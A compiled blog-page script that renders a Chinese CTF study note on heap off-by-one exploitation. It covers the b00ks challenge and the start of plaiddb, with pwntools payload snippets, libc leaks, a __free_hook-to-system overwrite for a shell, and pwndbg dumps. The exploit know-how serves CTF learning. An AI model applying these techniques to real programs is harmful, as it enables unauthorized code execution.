import{_ as y}from"./ValaxyMain.vue_vue_type_style_index_0_lang-fe952921.js";import{_ as F,p as C,c as D,w as o,o as A,a as s,b as l,d as a,r as t,e as i}from"./app-a51598bf.js";import"./YunFooter.vue_vue_type_script_setup_true_lang-9cc900c2.js";import"./YunCard.vue_vue_type_script_setup_true_lang-fac3e250.js";import"./YunPageHeader.vue_vue_type_script_setup_true_lang-e8684ee8.js";const _="/chunk_offbyone/1.jpg",d="/chunk_offbyone/2.png",f="/chunk_offbyone/3.png",h="/chunk_offbyone/4.png",u="/chunk_offbyone/5.png",E="/chunk_offbyone/6.png",b="/chunk_offbyone/7.png",x="/chunk_offbyone/8.png",m="/chunk_offbyone/9.png",g="/chunk_offbyone/10.png",k="/chunk_offbyone/11.png",z="/chunk_offbyone/12.png",v="/chunk_offbyone/13.png",w="/chunk_offbyone/14.png",B="/chunk_offbyone/15.png",T="/chunk_offbyone/16.png",P="/chunk_offbyone/17.png",U="/chunk_offbyone/18.png",I="/chunk_offbyone/19.png",N="/chunk_offbyone/20.png",S="/chunk_offbyone/21.png",$="/chunk_offbyone/22.png",L="/chunk_offbyone/23.png",R="/chunk_offbyone/24.png",V="/chunk_offbyone/25.png",j="/chunk_offbyone/26.png",q="/chunk_offbyone/27.png",O="/chunk_offbyone/28.png",G="/chunk_offbyone/29.png",M="/chunk_offbyone/30.png",J="/chunk_offbyone/31.png",X="/chunk_offbyone/32.png",Z="/chunk_offbyone/33.png",Y="/chunk_offbyone/34.png",H="/chunk_offbyone/35.png",K="/chunk_offbyone/36.png",Q="/chunk_offbyone/37.png",W="/chunk_offbyone/38.png",ss="/chunk_offbyone/39.png",So=JSON.parse('{"title":"堆利用(三)之offbyone","description":"","frontmatter":{"categories":"二进制","date":"2021-04-28T15:06:21.000Z","layout":"post","tags":null,"title":"堆利用(三)之offbyone"},"headers":[{"level":2,"title":"一、Asis CTF 2016 b00ks wp (null off-by-one)【详】","slug":"一、asis-ctf-2016-b00ks-wp-null-off-by-one-【详】","link":"#一、asis-ctf-2016-b00ks-wp-null-off-by-one-【详】","children":[]},{"level":2,"title":"二、ctf-wiki","slug":"二、ctf-wiki","link":"#二、ctf-wiki","children":[]}],"relativePath":"pages/posts/chunk offbyone.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/chunk offbyone.md","lastUpdated":1690730773000}'),c=JSON.parse('{"title":"堆利用(三)之offbyone","description":"","frontmatter":{"categories":"二进制","date":"2021-04-28T15:06:21.000Z","layout":"post","tags":null,"title":"堆利用(三)之offbyone"},"headers":[{"level":2,"title":"一、Asis CTF 2016 b00ks wp (null off-by-one)【详】","slug":"一、asis-ctf-2016-b00ks-wp-null-off-by-one-【详】","link":"#一、asis-ctf-2016-b00ks-wp-null-off-by-one-【详】","children":[]},{"level":2,"title":"二、ctf-wiki","slug":"二、ctf-wiki","link":"#二、ctf-wiki","children":[]}],"relativePath":"pages/posts/chunk offbyone.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/chunk offbyone.md","lastUpdated":1690730773000}'),ls={name:"pages/posts/chunk offbyone.md",data(){return{data:c,frontmatter:c.frontmatter,$frontmatter:c.frontmatter}},setup(){C("pageData",c)}},os=s("p",null,"本文主要记录阅读一些文章时的笔记及总结",-1),ns={id:"一、asis-ctf-2016-b00ks-wp-null-off-by-one-【详】",tabindex:"-1"},as=s("p",null,"先看一道例题 b00ks。",-1),es=s("p",null,[l("漏洞的位置是输入名字那里。调试的时候输入的name为'a'*30+'bc'。 然后pwndbg中search abc。 "),s("img",{src:_,alt:"1"}),l(" 构造堆块1 "),s("img",{src:d,alt:"2"})],-1),ts=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"createbook"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"150"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"kkbook1"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"100"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"haha"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),cs=s("p",null,"存放name和description的内存结构如下",-1),ps=s("p",null,[s("img",{src:f,alt:"3"})],-1),rs=s("p",null,"edit1号块的时候，是从discription开始写的。",-1),ys=s("p",null,"用print输出book1，就会得到book1的地址。",-1),Fs=s("p",null,[s("code",null,"book1_addr ==> 0x5555557581d0")],-1),Cs=s("p",null,"在book1中构造一个fake_chunk。使fake_book1_name指向book2_des，fake_book1_des指向book2_des。book1_des的地址是 0x5555557580c0",-1),Ds=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"a"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"40"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"01"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"book1_addr "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"40"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"book1_addr "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"38"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"ffff"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),As=s("p",null,[s("img",{src:h,alt:"4"})],-1),is=s("p",null,"接下来我们修改作者，溢出，使得book1变为我们构造的fake_book1。",-1),_s=s("p",null,[s("img",{src:u,alt:"5"})],-1),ds=s("p",null,[s("img",{src:E,alt:"6"})],-1),fs=s("p",null,"计算基址：",-1),hs=s("p",null,"mmap分配的地址如下",-1),us=s("p",null,[s("img",{src:b,alt:"7"})],-1),Es=s("p",null,"libc的地址如下",-1),bs=s("p",null,[s("img",{src:x,alt:"8"})],-1),xs=s("p",null,[s("code",null,"offset = book2_name_addr - 0x00007ffff7a0d000 = 0x4da010")],-1),ms=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"pwndbg"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," distance "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7a0d000"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"00007ffff7ee7010")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7a0d000"),s("span",{style:{color:"#A6ACCD"}},"->"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7ee7010"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"is"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"4da010"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#FFCB6B"}},"bytes"),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"9b402"),s("span",{style:{color:"#82AAFF"}}," words"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),gs=s("p",null,"自己设置的加载基址是不变的，但是本题开启了PIE，每次基址都是不同的，所以需要算一下。",-1),ks=s("p",null,"接下来泄漏一些重要函数的地址",-1),zs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"free_hook_addr "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," libc_base "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," libc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"symbols"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"__free_hook"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"]")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"system_addr "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," libc_base "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," libc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"symbols"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"system"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"]")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"binsh_addr "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," libc_base "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," libc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"search"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"/bin/sh"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},")."),s("span",{style:{color:"#82AAFF"}},"next"),s("span",{style:{color:"#89DDFF"}},"()")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"----")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"book2_name_addr "),s("span",{style:{color:"#89DDFF"}},"==>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7ee7010")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"book2_des_addr "),s("span",{style:{color:"#89DDFF"}},"==>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7918010")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"libc_base "),s("span",{style:{color:"#89DDFF"}},"==>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7a0d000")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"free_hook_addr "),s("span",{style:{color:"#89DDFF"}},"==>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7dd37a8")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"system_addr "),s("span",{style:{color:"#89DDFF"}},"==>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7a0d000")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"binsh_addr "),s("span",{style:{color:"#89DDFF"}},"==>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7b99e17")])])])],-1),vs=s("p",null,"记录一下内存结构",-1),ws=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#起始")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"55555575605d"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"35"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#堆块1")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"00005555557581d0"),s("span",{style:{color:"#A6ACCD"}},"--->"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0000555555758100")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#堆块1-description")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"pwndbg"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," telescope "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0000555555758100")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F78C6C"}},"00"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#F78C6C"}},"0000"),s("span",{style:{color:"#A6ACCD"}},"│   "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758100"),s("span",{style:{color:"#A6ACCD"}}," ◂— "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"1")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F78C6C"}},"01"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#F78C6C"}},"0008"),s("span",{style:{color:"#A6ACCD"}},"│   "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758108"),s("span",{style:{color:"#A6ACCD"}}," —▸ "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758210"),s("span",{style:{color:"#A6ACCD"}}," —▸ "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7918010"),s("span",{style:{color:"#A6ACCD"}}," ◂— "),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"hello world"),s("span",{style:{color:"#89DDFF"}},"'")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F78C6C"}},"02"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#F78C6C"}},"0010"),s("span",{style:{color:"#A6ACCD"}},"│   "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758110"),s("span",{style:{color:"#A6ACCD"}}," —▸ "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758208"),s("span",{style:{color:"#A6ACCD"}}," —▸ "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7ffff7ee7010"),s("span",{style:{color:"#A6ACCD"}}," ◂— "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"326b6f6f626b6b"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"/*"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"kkbook2"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"*/")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F78C6C"}},"03"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#F78C6C"}},"0018"),s("span",{style:{color:"#A6ACCD"}},"│   "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758118"),s("span",{style:{color:"#A6ACCD"}}," ◂— "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"ffff")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F78C6C"}},"04"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#F78C6C"}},"0020"),s("span",{style:{color:"#A6ACCD"}},"│   "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758120"),s("span",{style:{color:"#A6ACCD"}}," ◂— "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"... ↓")])])])],-1),Bs=s("p",null,[s("img",{src:m,alt:"9"})],-1),Ts=s("p",null,"此时edit 1号块，就会修改1的description部分，即跳转到堆块2的name部分。",-1),Ps=s("p",null,[s("img",{src:g,alt:"10"})],-1),Us=s("p",null,"再edit 2号块，修改的是2号块的des",-1),Is=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"editbook"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"2"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"system_addr"),s("span",{style:{color:"#89DDFF"}},"))")])])])],-1),Ns=s("p",null,[s("img",{src:k,alt:"11"})],-1),Ss=s("p",null,"ida中查看free函数",-1),$s=s("p",null,[s("img",{src:z,alt:"12"})],-1),Ls=s("p",null,"所以free(2)，就会执行system(/bin/sh)，即可getshell。",-1),Rs=s("p",null,[s("img",{src:v,alt:"13"})],-1),Vs=s("p",null,[s("img",{src:w,alt:"14"})],-1),js=s("p",null,"如果这个计算是正确的话，也就是说，指针原本指向的就是name区域？",-1),qs=s("p",null,"还参考了如下文章",-1),Os={id:"二、ctf-wiki",tabindex:"-1"},Gs=s("p",null,"1、示例一运行失败，最多只能覆盖16字节，当传入17个字节时，会报错。可能是加入了一些检查机制。",-1),Ms=s("p",null,[s("img",{src:B,alt:"15"})],-1),Js=s("p",null,"2、题目2---plaidctf 2015 plaiddb",-1),Xs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"预先参考博客：")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"https"),s("span",{style:{color:"#89DDFF"}},"://"),s("span",{style:{color:"#A6ACCD"}},"bbs"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"pediy"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"com"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"thread"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"246966."),s("span",{style:{color:"#A6ACCD"}},"htm")])])])],-1),Zs=s("p",null,"开启的保护如下",-1),Ys=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"Arch"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}},"     amd64"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"64"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"little")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    RELRO"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}},"    Full RELRO")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    Stack"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}},"    Canary found")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    NX"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}},"       NX enabled")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    PIE"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}},"      PIE enabled")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    FORTIFY"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}},"  Enabled")])])])],-1),Hs=s("p",null,"运行程序，发现PUT是输入，GET和DUMP都可以输出内容，DUMP是输出所有内容，DEL是删除内容。",-1),Ks=s("p",null,[s("img",{src:T,alt:"16"})],-1),Qs=s("p",null,"ida中分析，发现GET和PUT最开始都会调用sub_1040进行单行读取。",-1),Ws=s("p",null,[s("img",{src:P,alt:"17"})],-1),sl=s("p",null,"红框下面的v1=0，存在off by one漏洞。",-1),ll=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"DEL"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"th3fl4g"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}},"  "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#delet th3fl4g")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"A"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"80"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"1"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"80"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"B"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"18"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"2"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"18"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"C"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"60"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"3"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"60"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"D"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"f0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"4"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"f0"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),ol=s("p",null,"内存结构如下",-1),nl=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"pwndbg"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," heap")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758000"),s("span",{style:{color:"#A6ACCD"}}," FASTBIN "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"65"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#计算出下一个堆块的位置")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758090"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#key A的地址")]),l(`
